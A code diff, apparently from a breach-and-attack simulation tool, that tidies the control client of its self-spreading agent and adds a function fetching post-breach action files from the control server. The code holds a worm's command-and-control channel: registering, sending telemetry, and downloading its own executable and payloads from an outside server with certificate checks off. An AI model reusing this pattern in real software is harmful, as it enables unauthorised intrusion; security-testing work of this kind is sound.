@@ -19,9 +19,12 @@ requests.packages.urllib3.disable_warnings()
 
 LOG = logging.getLogger(__name__)
 DOWNLOAD_CHUNK = 1024
+
+PBA_FILE_DOWNLOAD = "https://%s/api/pba/download/%s"
+
 # random number greater than 5,
 # to prevent the monkey from just waiting forever to try and connect to an island before going elsewhere.
-TIMEOUT = 15
+TIMEOUT_IN_SECONDS = 15
 
 
 class ControlClient(object):
@@ -50,7 +53,7 @@ class ControlClient(object):
         if ControlClient.proxies:
             monkey['tunnel'] = ControlClient.proxies.get('https')
 
-        requests.post("https://%s/api/monkey" % (WormConfiguration.current_server,),
+        requests.post("https://%s/api/monkey" % (WormConfiguration.current_server,),  # noqa: DUO123
                       data=json.dumps(monkey),
                       headers={'content-type': 'application/json'},
                       verify=False,
@@ -73,16 +76,16 @@ class ControlClient(object):
                 if ControlClient.proxies:
                     debug_message += " through proxies: %s" % ControlClient.proxies
                 LOG.debug(debug_message)
-                requests.get("https://%s/api?action=is-up" % (server,),
+                requests.get("https://%s/api?action=is-up" % (server,),  # noqa: DUO123
                              verify=False,
                              proxies=ControlClient.proxies,
-                             timeout=TIMEOUT)
+                             timeout=TIMEOUT_IN_SECONDS)
                 WormConfiguration.current_server = current_server
                 break
 
             except ConnectionError as exc:
                 current_server = ""
-                LOG.warn("Error connecting to control server %s: %s", server, exc)
+                LOG.warning("Error connecting to control server %s: %s", server, exc)
 
         if current_server:
             return True
@@ -109,30 +112,31 @@ class ControlClient(object):
             monkey = {}
             if ControlClient.proxies:
                 monkey['tunnel'] = ControlClient.proxies.get('https')
-            reply = requests.patch("https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID),
-                                   data=json.dumps(monkey),
-                                   headers={'content-type': 'application/json'},
-                                   verify=False,
-                                   proxies=ControlClient.proxies)
+            requests.patch("https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID),  # noqa: DUO123
+                           data=json.dumps(monkey),
+                           headers={'content-type': 'application/json'},
+                           verify=False,
+                           proxies=ControlClient.proxies)
         except Exception as exc:
-            LOG.warn("Error connecting to control server %s: %s",
-                     WormConfiguration.current_server, exc)
+            LOG.warning("Error connecting to control server %s: %s",
+                        WormConfiguration.current_server, exc)
             return {}
 
     @staticmethod
-    def send_telemetry(telem_type, data):
+    def send_telemetry(telem_category, data):
         if not WormConfiguration.current_server:
+            LOG.error("Trying to send %s telemetry before current server is established, aborting." % telem_category)
             return
         try:
-            telemetry = {'monkey_guid': GUID, 'telem_type': telem_type, 'data': data}
-            reply = requests.post("https://%s/api/telemetry" % (WormConfiguration.current_server,),
-                                  data=json.dumps(telemetry),
-                                  headers={'content-type': 'application/json'},
-                                  verify=False,
-                                  proxies=ControlClient.proxies)
+            telemetry = {'monkey_guid': GUID, 'telem_category': telem_category, 'data': data}
+            requests.post("https://%s/api/telemetry" % (WormConfiguration.current_server,),  # noqa: DUO123
+                          data=json.dumps(telemetry),
+                          headers={'content-type': 'application/json'},
+                          verify=False,
+                          proxies=ControlClient.proxies)
         except Exception as exc:
-            LOG.warn("Error connecting to control server %s: %s",
-                     WormConfiguration.current_server, exc)
+            LOG.warning("Error connecting to control server %s: %s",
+                        WormConfiguration.current_server, exc)
 
     @staticmethod
     def send_log(log):
@@ -140,32 +144,33 @@ class ControlClient(object):
             return
         try:
             telemetry = {'monkey_guid': GUID, 'log': json.dumps(log)}
-            reply = requests.post("https://%s/api/log" % (WormConfiguration.current_server,),
-                                  data=json.dumps(telemetry),
-                                  headers={'content-type': 'application/json'},
-                                  verify=False,
-                                  proxies=ControlClient.proxies)
+            requests.post("https://%s/api/log" % (WormConfiguration.current_server,),  # noqa: DUO123
+                          data=json.dumps(telemetry),
+                          headers={'content-type': 'application/json'},
+                          verify=False,
+                          proxies=ControlClient.proxies)
         except Exception as exc:
-            LOG.warn("Error connecting to control server %s: %s",
-                     WormConfiguration.current_server, exc)
+            LOG.warning("Error connecting to control server %s: %s",
+                        WormConfiguration.current_server, exc)
 
     @staticmethod
     def load_control_config():
         if not WormConfiguration.current_server:
             return
         try:
-            reply = requests.get("https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID),
+            reply = requests.get("https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID),  # noqa: DUO123
                                  verify=False,
                                  proxies=ControlClient.proxies)
 
         except Exception as exc:
-            LOG.warn("Error connecting to control server %s: %s",
-                     WormConfiguration.current_server, exc)
+            LOG.warning("Error connecting to control server %s: %s",
+                        WormConfiguration.current_server, exc)
             return
 
         try:
             unknown_variables = WormConfiguration.from_kv(reply.json().get('config'))
-            LOG.info("New configuration was loaded from server: %r" % (WormConfiguration.as_dict(),))
+            LOG.info("New configuration was loaded from server: %r" %
+                     (WormConfiguration.hide_sensitive_info(WormConfiguration.as_dict()),))
         except Exception as exc:
             # we don't continue with default conf here because it might be dangerous
             LOG.error("Error parsing JSON reply from control server %s (%s): %s",
@@ -180,13 +185,13 @@ class ControlClient(object):
         if not WormConfiguration.current_server:
             return
         try:
-            requests.patch("https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID),
+            requests.patch("https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID),  # noqa: DUO123
                            data=json.dumps({'config_error': True}),
                            headers={'content-type': 'application/json'},
                            verify=False,
                            proxies=ControlClient.proxies)
         except Exception as exc:
-            LOG.warn("Error connecting to control server %s: %s", WormConfiguration.current_server, exc)
+            LOG.warning("Error connecting to control server %s: %s", WormConfiguration.current_server, exc)
             return {}
 
     @staticmethod
@@ -242,7 +247,7 @@ class ControlClient(object):
             if (monkeyfs.isfile(dest_file)) and (size == monkeyfs.getsize(dest_file)):
                 return dest_file
             else:
-                download = requests.get("https://%s/api/monkey/download/%s" %
+                download = requests.get("https://%s/api/monkey/download/%s" %  # noqa: DUO123
                                         (WormConfiguration.current_server, filename),
                                         verify=False,
                                         proxies=ControlClient.proxies)
@@ -256,8 +261,8 @@ class ControlClient(object):
                     return dest_file
 
         except Exception as exc:
-            LOG.warn("Error connecting to control server %s: %s",
-                     WormConfiguration.current_server, exc)
+            LOG.warning("Error connecting to control server %s: %s",
+                        WormConfiguration.current_server, exc)
 
     @staticmethod
     def get_monkey_exe_filename_and_size_by_host(host):
@@ -268,7 +273,7 @@ class ControlClient(object):
         if not WormConfiguration.current_server:
             return None, None
         try:
-            reply = requests.post("https://%s/api/monkey/download" % (WormConfiguration.current_server,),
+            reply = requests.post("https://%s/api/monkey/download" % (WormConfiguration.current_server,),  # noqa: DUO123
                                   data=json.dumps(host_dict),
                                   headers={'content-type': 'application/json'},
                                   verify=False, proxies=ControlClient.proxies)
@@ -283,8 +288,8 @@ class ControlClient(object):
                 return None, None
 
         except Exception as exc:
-            LOG.warn("Error connecting to control server %s: %s",
-                     WormConfiguration.current_server, exc)
+            LOG.warning("Error connecting to control server %s: %s",
+                        WormConfiguration.current_server, exc)
 
         return None, None
 
@@ -299,10 +304,20 @@ class ControlClient(object):
             try:
                 target_addr, target_port = my_proxy.split(':', 1)
                 target_port = int(target_port)
-            except:
+            except ValueError:
                 return None
         else:
             proxy_class = HTTPConnectProxy
             target_addr, target_port = None, None
 
         return tunnel.MonkeyTunnel(proxy_class, target_addr=target_addr, target_port=target_port)
+
+    @staticmethod
+    def get_pba_file(filename):
+        try:
+            return requests.get(PBA_FILE_DOWNLOAD %  # noqa: DUO123
+                                (WormConfiguration.current_server, filename),
+                                verify=False,
+                                proxies=ControlClient.proxies)
+        except requests.exceptions.RequestException:
+            return False
